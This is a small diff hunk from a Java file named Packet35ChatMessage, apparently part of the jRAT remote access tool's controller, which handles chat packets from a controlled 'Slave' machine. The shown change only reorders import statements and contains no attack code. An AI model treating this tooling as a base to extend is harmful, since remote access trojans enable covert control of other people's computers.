@@ -3,12 +3,12 @@ package jrat.controller.packets.incoming;
 import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameRemoteChat;
 
-import java.awt.Color;
-import java.io.DataInputStream;
 import javax.swing.text.AttributeSet;
 import javax.swing.text.SimpleAttributeSet;
 import javax.swing.text.StyleConstants;
 import javax.swing.text.StyleContext;
+import java.awt.*;
+import java.io.DataInputStream;
 
 
 public class Packet35ChatMessage extends AbstractIncomingPacket {
